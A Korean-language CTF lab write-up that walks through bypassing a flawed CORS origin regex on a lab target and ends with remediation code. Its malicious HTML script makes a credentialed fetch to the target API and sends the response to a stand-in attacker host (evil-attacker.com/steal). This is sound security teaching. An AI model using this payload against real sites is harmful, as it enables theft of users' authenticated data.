+++
title = "VulnABLE CTF [LUXORA] Write-up: CORS Misconfiguration 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "CORS", "Silver", "Regex Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: CORS Misconfiguration 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Infrastructure Layer (CORS Misconfig)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/cors/silver/api`
- **목표**: 타겟 API 서버가 와일드카드(`*`) 대신 `Origin` 헤더를 검증하는 동적 CORS 설정을 사용하고 있지만, 그 검증에 사용된 **정규표현식(Regex)의 논리적 결함**을 악용하여 인증된 상태(Credentials: true)로 데이터를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/cors/silver/api` 로 여러 가지 `Origin` 헤더를 보내면서 서버가 어떻게 반응하는지 테스트합니다.

**[테스트 1: 내 해커 도메인 전송]**
```http
GET /cors/silver/api HTTP/1.1
Origin: http://evil-attacker.com
```
➔ 서버 응답 헤더: (CORS 헤더가 아예 반환되지 않음. 차단됨)

**[테스트 2: 정상적인 서브도메인 전송]**
```http
GET /cors/silver/api HTTP/1.1
Origin: https://app.luxora.test
```
➔ 서버 응답 헤더: 
```http
Access-Control-Allow-Origin: https://app.luxora.test
Access-Control-Allow-Credentials: true
```

**[해커의 사고 과정]**
1. 이 API는 요청받은 `Origin` 헤더를 읽어서 검사한 뒤, 통과하면 그 `Origin` 값을 그대로 `Access-Control-Allow-Origin` 에 메아리(Echo) 쳐주고 있다.
2. 검증 로직은 아마도 `luxora.test` 라는 문자열이 들어있는지 확인하는 정규식을 쓸 것이다.
3. 이전에 PostMessage나 Open Redirect에서 썼던 **"정규표현식 우회 기법"**이 여기서도 똑같이 통하지 않을까?

---

## 💥 2. 취약점 식별 및 정규식 우회 도메인 확보 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Victim's Browser ]
|-- Visits Attacker.com
|-- AJAX Request to Target.com --(with Cookies)--> [ Target.com API ]
                                                   |-- Allows * Origin
<-- Sensitive Data Returned -----------------------|
|-- Exfiltrates Data to Attacker
```


개발자가 작성했을 법한 취약한 정규식 패턴을 추측해 봅니다.

* **가설 A (끝을 닫지 않음)**: `^https?:\/\/.*luxora\.test`
  ➔ 우회법: `https://luxora.test.evil-attacker.com`
* **가설 B (점을 이스케이프 하지 않음)**: `^https?:\/\/.*luxora.test$`
  ➔ 우회법: `https://luxoratest.com` (점을 임의의 한 문자로 해석함)

### 💡 도메인 테스트
Burp Suite를 통해 두 가설을 모두 테스트해 봅니다. 이 챌린지는 가설 A(문자열 끝 미검증)에 해당한다고 가정하겠습니다.

**[조작된 Origin 패킷 전송]**
```http
GET /cors/silver/api HTTP/1.1
Origin: https://luxora.test.evil-attacker.com
```

### 🔍 서버의 응답
서버는 이 가짜 도메인을 정상적인 사내 서브도메인으로 착각하고 CORS 허용 헤더를 뱉어냅니다!

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://luxora.test.evil-attacker.com
Access-Control-Allow-Credentials: true
```

---

## 🚀 3. 공격 수행 및 정보 탈취

이제 해커는 `luxora.test.evil-attacker.com` 이라는 실제 도메인(혹은 로컬 hosts 변조)에 악성 HTML을 호스팅합니다.

**[악성 HTML 소스코드]**
```html
<script>
    // 인증 정보(쿠키)를 포함하여 타겟 API로 요청을 보냄
    fetch("http://localhost:3000/cors/silver/api", {
        credentials: "include" // 세션 쿠키를 함께 전송
    })
    .then(response => response.json())
    .then(data => {
        // 탈취한 데이터를 해커 서버로 전송
        fetch("http://evil-attacker.com/steal?data=" + btoa(JSON.stringify(data)));
    });
</script>
```

### 🔍 결과 확인
관리자가 해커의 도메인(`https://luxora.test.evil-attacker.com/exploit.html`)을 방문하는 순간, 관리자의 세션 쿠키를 이용해 API가 호출됩니다. 서버는 동적 CORS 검증을 통과시키고, 피해자의 브라우저는 해커 스크립트에게 데이터를 넘겨줍니다.

해커의 로그 서버에 다음과 같은 데이터가 찍힙니다.
```text
{"name":"Admin","role":"super_admin","flag":"FLAG{CORS_🥈_REGEX_ORIGIN_BYPASS_D4E5F6}"}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

동적 CORS 설정에서 정규표현식을 잘못 사용할 경우, `Access-Control-Allow-Credentials: true` 와 결합하여 사용자의 세션 쿠키가 탈취되는 최악의 보안 사고가 발생함을 입증했습니다.

**🔥 획득한 플래그:**
`FLAG{CORS_🥈_REGEX_ORIGIN_BYPASS_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
정규식을 통해 도메인을 검사할 때, 와일드카드(`.*`) 남용과 앵커(`$`, `^`) 누락이 만든 전형적인 로직 결함입니다.

* **안전한 패치 가이드 (엄격한 화이트리스트 사용)**
1. **정규식 대신 배열(Array) 완전 일치(Exact Match) 사용**: (가장 권장됨)
   서브도메인이 몇 개 없다면 정규식을 버리고 문자열 배열을 사용하는 것이 가장 안전합니다.
   ```javascript
   const allowed = ["https://luxora.test", "https://app.luxora.test", "https://api.luxora.test"];
   if (allowed.includes(req.headers.origin)) {
       res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
   }
   ```
2. **안전한 정규식 사용**: 서브도메인이 너무 많아 부득이하게 정규식을 써야 한다면, 점(`.`)을 반드시 이스케이프(`\.`)하고 문자열의 끝(`$`)을 닫아주어야 합니다.
   ```javascript
   // 안전한 정규식 (점(.) 이스케이프 및 문자열 끝($) 명시)
   const originRegex = /^https:\/\/(?:[a-zA-Z0-9-]+\.)*luxora\.test$/;
   if (originRegex.test(req.headers.origin)) {
       // ...
   }